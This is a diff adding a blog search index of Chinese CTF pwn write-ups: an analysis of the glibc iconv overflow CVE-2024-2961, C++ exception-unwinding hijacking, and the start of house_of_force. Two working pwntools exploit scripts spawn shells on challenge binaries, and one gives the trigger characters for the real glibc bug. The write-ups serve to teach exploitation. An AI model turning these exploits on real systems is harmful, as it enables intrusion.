@@ -1,0 +1,3759 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>CVE-2024-2961</title>
+    <url>/2024/09/21/CVE-2024-2961/</url>
+    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
+<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
+<pre><code>字符 |		溢出内容		|		原UTF-8表示
+劄  		$*H [24 2A 48]      	  \xe5\x8a\x84
+䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a
+峛  		$*H [24 2A 48]			  \xe5\xb3\x9b
+</code></pre>
+<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
+<pre><code class="c">#define ESC	0x1b
+enum&#123;
+    ASCII_set = 0,
+      GB2312_set,		//1
+      GB12345_set,	//2
+      CNS11643_1_set,	//3
+      ISO_IR_165_set,	//4
+      SO_mask = 7,
+
+      GB7589_set = 1 &lt;&lt; 3,
+      GB13131_set = 2 &lt;&lt; 3,
+      CNS11643_2_set = 3 &lt;&lt; 3,
+      SS2_mask = 3 &lt;&lt; 3,
+
+      GB7590_set = 1 &lt;&lt; 5,
+      GB13132_set = 2 &lt;&lt; 5,
+      CNS11643_3_set = 3 &lt;&lt; 5,
+      CNS11643_4_set = 4 &lt;&lt; 5,
+      CNS11643_5_set = 5 &lt;&lt; 5,
+      CNS11643_6_set = 6 &lt;&lt; 5,
+      CNS11643_7_set = 7 &lt;&lt; 5,
+      SS3_mask = 7 &lt;&lt; 5,
+&#125;
+...........................................................
+/* See whether we have to emit an escape sequence.  */		      
+    if (set != used)						      
+      &#123;								      
+        /* First see whether we announced that we use this		      
+           character set.  */					      
+        if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))	      
+          &#123;								      
+        const char *escseq;					      
+                                          
+        if (outptr + 4 &gt; outend)				      
+          &#123;							      
+            result = __GCONV_FULL_OUTPUT;			      
+            break;						      
+          &#125;							      
+                                          
+        assert (used &gt;= 1 &amp;&amp; used &lt;= 4);			      
+        escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;			      
+        *outptr++ = ESC;					      
+        *outptr++ = &#39;$&#39;;					      
+        *outptr++ = *escseq++;					      
+        *outptr++ = *escseq++;					      
+                                          
+        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; 8);			      
+          &#125;								      
+        else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))
+          &#123;								      
+        const char *escseq;					      
+                                          
+        assert (used == CNS11643_2_set); /* XXX */		      
+        escseq = &quot;*H&quot;;						      
+        *outptr++ = ESC;					      
+        *outptr++ = &#39;$&#39;;					      
+        *outptr++ = *escseq++;					      
+        *outptr++ = *escseq++;					      
+                                          
+        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; 8);			      
+          &#125;								      
+        else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))
+          &#123;								      
+        const char *escseq;					      
+                                          
+        assert ((used &gt;&gt; 5) &gt;= 3 &amp;&amp; (used &gt;&gt; 5) &lt;= 7);		      
+        escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;		      
+        *outptr++ = ESC;					      
+        *outptr++ = &#39;$&#39;;					      
+        *outptr++ = *escseq++;					      
+        *outptr++ = *escseq++;					      
+                                          
+        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; 8);			      
+          &#125;								      
+                                          
+        if (used == CNS11643_2_set)					      
+          &#123;								      
+        if (outptr + 2 &gt; outend)				      
+          &#123;							      
+            result = __GCONV_FULL_OUTPUT;			      
+            break;						      
+          &#125;							      
+        *outptr++ = SS2_0;					      
+        *outptr++ = SS2_1;					      
+          &#125;								      
+        else if (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      
+          &#123;								      
+        if (outptr + 2 &gt; outend)				      
+          &#123;							      
+            result = __GCONV_FULL_OUTPUT;			      
+            break;						      
+          &#125;							      
+        *outptr++ = SS3_0;					      
+        *outptr++ = SS3_1;					      
+          &#125;								      
+        else							      
+          &#123;								      
+        /* We only have to emit something if currently ASCII is	      
+           selected.  Otherwise we are switching within the	      
+           SO charset.  */					      
+        if (set == ASCII_set)					      
+          &#123;							      
+            if (outptr + 1 &gt; outend)				      
+              &#123;							      
+            result = __GCONV_FULL_OUTPUT;			      
+            break;						      
+              &#125;							      
+            *outptr++ = SO;					      
+          &#125;							      
+          &#125;								      
+                                          
+        /* Always test the length here since we have used up all the      
+           guaranteed output buffer slots.  */			      
+        if (outptr + 2 &gt; outend)					      
+          &#123;								      
+        result = __GCONV_FULL_OUTPUT;				      
+        break;							      
+          &#125;								      
+      &#125;								      
+    else if (outptr + 2 &gt; outend)					      
+      &#123;								      
+        result = __GCONV_FULL_OUTPUT;				      
+        break;							      
+      &#125;								      
+                                          
+    *outptr++ = buf[0];						      
+    *outptr++ = buf[1];						      
+    set = used;							      
+      &#125;									      
+                                          
+    /* Now that we wrote the output increment the input pointer.  */	      
+    inptr += 4;								      
+  &#125;
+</code></pre>
+<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
+<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
+<p><strong>set</strong>是当前的字符集标识</p>
+<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
+<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
+<p><strong>outend</strong> 是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
+<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
+<h5 id="三种不同的字符集"><a href="#三种不同的字符集" class="headerlink" title="三种不同的字符集"></a>三种不同的字符集</h5><p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single Shift 3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
+<h6 id="SO-Shift-Out"><a href="#SO-Shift-Out" class="headerlink" title="SO (Shift Out)"></a>SO (Shift Out)</h6><ul>
+<li><strong>用途</strong>: SO（Shift Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
+<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
+<li><strong>作用</strong>: 在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
+</ul>
+<h6 id="SS2-Single-Shift-2"><a href="#SS2-Single-Shift-2" class="headerlink" title="SS2 (Single Shift 2)"></a>SS2 (Single Shift 2)</h6><ul>
+<li><strong>用途</strong>: SS2（Single Shift 2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
+<li><strong>作用</strong>: 在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
+</ul>
+<h6 id="SS3-Single-Shift-3"><a href="#SS3-Single-Shift-3" class="headerlink" title="SS3 (Single Shift 3)"></a>SS3 (Single Shift 3)</h6><ul>
+<li><strong>用途</strong>: SS3（Single Shift 3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
+<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
+<li><strong>作用</strong>: 类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
+</ul>
+<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
+<pre><code class="c">  enum&#123;
+          ASCII_set = 0,
+        GB2312_set,		//1
+        GB12345_set,	//2
+        CNS11643_1_set,	//3
+        ISO_IR_165_set,	//4
+        SO_mask = 7,
+  
+        GB7589_set = 1 &lt;&lt; 3,
+        GB13131_set = 2 &lt;&lt; 3,
+        CNS11643_2_set = 3 &lt;&lt; 3,
+        SS2_mask = 3 &lt;&lt; 3,
+  
+        GB7590_set = 1 &lt;&lt; 5,
+        GB13132_set = 2 &lt;&lt; 5,
+        CNS11643_3_set = 3 &lt;&lt; 5,
+        CNS11643_4_set = 4 &lt;&lt; 5,
+        CNS11643_5_set = 5 &lt;&lt; 5,
+        CNS11643_6_set = 6 &lt;&lt; 5,
+        CNS11643_7_set = 7 &lt;&lt; 5,
+        SS3_mask = 7 &lt;&lt; 5,
+  &#125;
+</code></pre>
+<h5 id="实际运行中的-used-及其对应分支"><a href="#实际运行中的-used-及其对应分支" class="headerlink" title="实际运行中的 used 及其对应分支"></a>实际运行中的 used 及其对应分支</h5><p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
+<p>具体哪一个 <code>used</code> 的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
+<ul>
+<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为 <code>GB2312_set</code>（值为1）。</li>
+<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_2_set</code>（值为24）。</li>
+<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为 <code>CNS11643_3_set</code>（值为96）。</li>
+</ul>
+<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为 <code>GB2312_set</code>（1），并进入第一个 <code>if</code> 分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code> 将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
+<h5 id="具体执行过程"><a href="#具体执行过程" class="headerlink" title="具体执行过程"></a>具体执行过程</h5><p><strong>1. 检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
+<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
+<p>我们现在详细分析下3个if分支的条件</p>
+<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code>	</p>
+<ul>
+<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p>
+</li>
+<li><p>(ann &amp; SO_ann) !&#x3D; (used &lt;&lt; 8)用于检测是否声明过该字符集</p>
+</li>
+<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p>
+</li>
+</ul>
+<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
+<ul>
+<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
+</ul>
+<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
+<pre><code class="c">if (outptr + 4 &gt; outend)				      
+&#123;							      
+    result = __GCONV_FULL_OUTPUT;			      
+    break;						     
+&#125;	
+</code></pre>
+<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
+<p><strong>3.生成转义序列</strong>：</p>
+<ul>
+<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
+<li>更新已声明的字符集<code>ann</code>。</li>
+</ul>
+<p><code>escseq</code> 是一个指向字符数组的指针，用于存储转义序列（escape sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
+<pre><code class="c">const char *escseq;
+
+// 例如，用于 SO 的情况
+escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;
+*outptr++ = ESC;
+*outptr++ = &#39;$&#39;;
+*outptr++ = *escseq++;
+*outptr++ = *escseq++;
+
+// 例如，用于 SS2 的情况
+escseq = &quot;*H&quot;;
+*outptr++ = ESC;
+*outptr++ = &#39;$&#39;;
+*outptr++ = *escseq++;
+*outptr++ = *escseq++;
+
+// 例如，用于 SS3 的情况
+escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;
+*outptr++ = ESC;
+*outptr++ = &#39;$&#39;;
+*outptr++ = *escseq++;
+*outptr++ = *escseq++;
+</code></pre>
+<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
+<ul>
+<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
+<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr + 2 &lt;&#x3D; outend</strong>则会加上ESC与0x4f的后缀。</li>
+</ul>
+<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr + 1 &lt;&#x3D; outend</strong>，则加入0x0e后缀。</p>
+<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
+<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
+<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
+<h4 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h4><h5 id="XGCTF-echo"><a href="#XGCTF-echo" class="headerlink" title="XGCTF [echo]"></a>XGCTF [echo]</h5><img src="/2024/09/21/CVE-2024-2961/image-20240921185742098.png" class="">
+
+<img src="/2024/09/21/CVE-2024-2961/image-20240921185755294.png" class="">
+
+<img src="/2024/09/21/CVE-2024-2961/image-20240921185806653.png" class="">
+
+<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的\x00给覆盖了，那么printf(“%s”,s)就能直接把canary的值打印出来了。</p>
+<img src="/2024/09/21/CVE-2024-2961/image-20240921185814773.png" class="">
+
+<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
+<pre><code class="python">#coding:utf-8
+from pwn import *
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+
+#p = process(&quot;./echo&quot;)
+p = remote(&quot;pwn.challenge.ctf.show&quot;,28257)
+libc = ELF(&quot;./libc-2.27.so&quot;)
+elf = ELF(&quot;./echo&quot;)
+p.send(&quot;a&quot;*0x25 + &quot;劄&quot;)
+p.recvuntil(b&quot;\x48&quot;)
+canary = u64(p.recv(7).rjust(8,b&quot;\x00&quot;))
+log.success(&quot;canary:&quot;+hex(canary))
+pop_rdi_ret = 0x401493
+ret_add = 0x40101a
+main_add = 0x401256
+p.sendline(b&quot;a&quot;*0x28 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(elf.got[&quot;puts&quot;]) + p64(elf.plt[&quot;puts&quot;]) + p64(main_add)) 
+
+libc_base = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)) - libc.sym[&quot;puts&quot;]
+log.success(&quot;libc_base:&quot;+hex(libc_base))
+system_add = libc_base + libc.sym[&quot;system&quot;]
+bin_sh_add = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
+
+p.send(&quot;collectcrop&quot;)
+payload2 = b&quot;a&quot;*0x28 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)
+p.sendline(payload2)
+p.interactive()
+</code></pre>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Exploits under exception handling</title>
+    <url>/2024/09/21/Exploits-under-exception-handling/</url>
+    <content><![CDATA[<h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>  <code>throw</code> <code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
+<h4 id="原理-题目分析"><a href="#原理-题目分析" class="headerlink" title="原理&amp;题目分析"></a>原理&amp;题目分析</h4><p>这里借助题目对其原理进行理解，其中加入了个人的一些推测和理解，有问题处希望师傅们批评指正。</p>
+<h5 id="2024-羊城杯-logger"><a href="#2024-羊城杯-logger" class="headerlink" title="[2024 羊城杯]logger"></a>[2024 羊城杯]logger</h5><img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170437604.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170505641.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170518829.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170528338.png" class="">
+
+<p>这里我一开始参考 <a href="https://www.bilibili.com/video/BV1eE421L7ZE/" title="" target="">DASCTF X GFCTF 2024四月-pwn-control【异常机制】</a>这个视频，想要覆盖掉rbp打栈迁移，实际从throw触发异常到catch捕获的主逻辑在<code>__cxa_throw</code>的<code>_Unwind_RaiseException</code>函数里，其中 <code>_Unwind_RaiseException</code> 是用于栈展开（stack unwinding）的关键函数之一，其主要功能如下：</p>
+<ul>
+<li>这个函数负责执行栈展开，即遍历当前调用栈上的各个栈帧，寻找匹配的 <code>catch</code> 块。</li>
+<li>栈展开过程中，函数会逐帧回溯，并在每个栈帧上调用编译器生成的处理函数来检查是否存在与异常类型匹配的 <code>catch</code> 块。</li>
+<li>如果找到匹配的 <code>catch</code> 块，栈展开停止，控制权转移到该块。</li>
+</ul>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170552763.png" class="">
+
+<p>从这个函数跳转出来后，会进入<code>0x4019a1</code>这里执行，我们对照IDA中的内容会发现这里实质上是<code>cleanup</code>这个子函数，该函数的主要功能如下：</p>
+<ul>
+<li><p>在栈展开的过程中，每个栈帧可能包含需要执行的清理操作（如调用析构函数）。</p>
+</li>
+<li><p>如果 <code>_Unwind_RaiseException</code> 确定某个栈帧不包含匹配的 <code>catch</code> 块，但需要进行清理操作，会调用与该栈帧关联的清理函数。这个清理函数通常会执行栈帧中需要的析构函数或者其他资源释放操作。</p>
+</li>
+<li><p>IDA 中识别为 <code>cleanup()</code> 的函数，就是这些清理操作的函数，它用于处理抛出异常过程中需要释放的资源。</p>
+</li>
+</ul>
+<p>这个vuln函数的命名是因为我一开始以为这个莫名其妙的无作为的函数是解题的关键，但通过以上的理解，其实这个函数更有可能是执行清理的具体函数，但由于该栈帧中没有需要清理的内容，所以显示为空。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170608549.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170616808.png" class="">
+
+<p>然后会调用<code>__Unwind_Resume</code>，这个函数是 C++ 异常处理机制中的一个重要函数，它用于在栈展开过程中恢复异常处理的流程，通常在执行完清理操作后继续展开栈帧。在该函数的末尾，我们发现我们的rbp实际已经被赋值为了想要的值。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170639538.png" class="">
+
+<p>但该题目与视频中的那道题最大的不同是，在将rbp控制后，没有机会进行leave;ret了，主函数是一个死循环，退出循环的方式是选项3直接调用exit退出。那么我们就没有机会打栈迁移了。</p>
+<p>那么我们需要利用新的方法，这时我参考了<a href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html" title="" target="">羊城杯 2024 pwn writeup</a>这篇wp中给的解法，发现程序中有很多地方另有玄机。其实程序中还有很多try,catch的组合，在没有被调用的函数中。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170659736.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170739062.png" class="">
+
+<p>什么？程序中居然有catch段中存在对system函数的调用！后面我们通过调试其实可以发现上面打印的错误信息的参数存在src中，正常会打印出Buffer Overflow这个信息，而且0x4040a0也会做为system的参数。更巧的是，一直被我们忘在一边的trace函数中边界处理不当，当i&#x3D;8时，实际可以往src处写入0x10个字节。那么我们就可以把&#x2F;bin&#x2F;sh写入src中，然后想办法把程序控制流转向这个catch块。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170749201.png" class="">
+
+<p>这里我们的问题又回到了如何劫持程序控制流，参考exp可以发现，是通过覆盖该函数栈帧的返回地址为0x401bc7来劫持的。那么结合前面所分析的函数调用链，其实我们可以这样子从大体上理解：出现调用cleanup是因为当前栈帧不匹配catch块，所以要进行清理，之后用<code>__unwind_resume</code>继续找匹配的catch块时，由于返回地址被改为了一个catch块的handler，所以可以直接匹配执行。要深入理解为什么改返回地址可行，我们可以通过追踪rcx值的变化实现，因为最后从<code>__unwind_resume</code>跳转到目标地址是通过<code>mov rsp,rcx;pop rcx;jmp rcx</code>实现的。提取出与rcx变化有关的指令按顺序如下：</p>
+<pre><code class="asm">&lt;_Unwind_Resume+316&gt; call 0x7fa75620d6a0
+...
+&lt;_Unwind_Resume+337&gt; call 0x7fb2f2d9dc20
+...
+&lt;_Unwind_Resume+402&gt; mov rcx, rax	#实际获取了上一个函数的返回值
+...
+&lt;_Unwind_Resume+414&gt; lea rcx, [rbp + rcx + 8]
+...
+&lt;_Unwind_Resume+447&gt; mov rsp,rcx
+&lt;_Unwind_Resume+450&gt; pop rcx
+&lt;_Unwind_Resume+451&gt; jmp rcx
+</code></pre>
+<p>我们可以再跟进<code>0x7fb2f2d9dc20</code>看一下，发现只是对rdx做了一些改变，要再往前找。而前面的<code>0x7fa75620d6a0</code>执行后恰好使rax变为0x90，和后面赋给rcx值时的rax值相同，说明该函数是关键，进去看看。</p>
+<p>其中的逻辑相当复杂，但在有个17次的循环后，有看到原来栈帧的返回地址，而执行过程中rbp始终为0x7ffcc254a5b0，_Unwind_Resume函数开始调用时也并没有改变rbp的值，这里rax实际能计算出一个当前rbp到处理栈帧返回地址附近的一个偏移，然后最后就能使rcx成为返回地址处的内容并跳转过去当作目标catch的handler函数进行执行。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170800205.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170811667.png" class="">
+
+<p>其实这和正常的栈溢出有点像，那我们不禁想如果覆盖成别的其他不属于handler的地址会如何呢？比如我们把返回地址覆盖为main试试，结果是会报出<strong>terminate called after throwing an instance of ‘char*’</strong>，因为异常没有正常匹配。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170824548.png" class="">
+
+<p>然后我们可以试试换一个catch(int)的handler进行匹配，发现会有如下错误，rdx是由前面<code>mov  rdx, qword ptr [rdx] </code>得到的，前面的rdx值为0x404208，也就是我们可控的地址，我们可以输入一个合法的地址进去看看。最后还是会报<strong>terminate called after throwing an instance of ‘char*’</strong>。后面看了别人博客才发现这个匹配的流程需要一定的经验。其他函数的catch块对应不上。</p>
+<blockquote>
+<p>将ret地址修改为backdoor函数的try块地址范围内<code>0x401252-0x401258</code>(在我的测试中发现，这个范围是个左开但是右侧不精确的范围，为了保证成功率可以使用左测边界+1的地址)。</p>
+</blockquote>
+<p>我们这里的try块的范围是从0x0000000000401BC2到0x0000000000401BC7的，最终能打通的范围也的确是0x0000000000401BC3到0x0000000000401BC7。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170839585.png" class="">
+
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170848861.png" class="">
+
+<p>之后还需要注意的一点是，最后进入目标handler后，存在一个<code>mov qword ptr [rbp - 0x18], rax</code>的赋值，我们需要确保覆盖的rbp的值减去0x18后为一个可写的地址，否则会出错。</p>
+<img src="/2024/09/21/Exploits-under-exception-handling/image-20240921170859003.png" class="">
+
+<p>最终exp如下：</p>
+<pre><code class="python">from pwn import *
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+p = process(&quot;pwn&quot;)
+def trace(data,choice=&quot;n&quot;):
+    p.sendlineafter(&quot;Your chocie:&quot;,&quot;1&quot;)
+    p.sendafter(&quot;You can record log details here:&quot;,data)
+    p.sendafter(&quot;Do you need to check the records?&quot;,choice)
+
+def warn(data):
+    p.sendlineafter(&quot;Your chocie:&quot;,&quot;2&quot;)
+    p.sendafter(&quot;Type your message here plz:&quot;,data)
+
+
+def exit():
+    p.sendlineafter(&quot;Your chocie:&quot;,&quot;3&quot;)
+magic = 0x0000000000401BC7
+fake_rbp = 0x404200     #只要其-0x18处可写就行
+
+for i in range(9):
+    trace(b&quot;/bin/sh\x00&quot;*2)
+
+payload = b&quot;A&quot;*0x70 + p64(fake_rbp) + p64(magic)
+warn(payload)
+p.interactive()
+                             
+</code></pre>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>主要调用链为<code>__cxa_throw</code>-&gt;<code>_Unwind_RaiseException</code>-&gt;<code>clearup</code>-&gt;<code>_Unwind_Resume</code>-&gt;<code>对应catch块的handler函数</code></li>
+<li>除了CHOP，有两处漏洞可以利用<ul>
+<li>覆盖rbp进行栈迁移（有leave;ret可供使用）</li>
+<li>覆盖返回地址到其他handler函数</li>
+</ul>
+</li>
+</ul>
+<h4 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h4><ul>
+<li><a href="https://blog.csdn.net/jennycisp/article/details/134965719">https://blog.csdn.net/jennycisp/article/details/134965719</a></li>
+<li><a href="https://www.bilibili.com/video/BV1eE421L7ZE/">https://www.bilibili.com/video/BV1eE421L7ZE/</a></li>
+<li><a href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html">https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>exception</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house_of_force</title>
+    <url>/2024/10/03/house-of-force/</url>
+    <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>能控制top chunk的size域</li>
+<li>能获取heap_base，进而计算出top_chunk的地址</li>
+<li>能自由控制堆分配尺寸大小</li>
+</ul>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
+<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
+</li>
+<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
+</li>
+<li><p>再申请一个chunk，往目标地址处写入值。</p>
+</li>
+</ul>
+<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
+<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
+<pre><code class="c++">victim = av-&gt;top;
+size = chunksize (victim);
+
+if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))
+&#123;
+  remainder_size = size - nb;			//分配后剩下的大小
+  remainder = chunk_at_offset (victim, nb);		//剩下的chunk
+  av-&gt;top = remainder;							//更新top chunk
+  set_head (victim, nb | PREV_INUSE |			//设置从原topchunk分配出的chunk的头部
+            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+  set_head (remainder, remainder_size | PREV_INUSE);	//设置新的top chunk的头部
+
+  check_malloced_chunk (av, victim, nb);
+  void *p = chunk2mem (victim);
+  alloc_perturb (p, bytes);
+  return p;
+&#125;
+</code></pre>
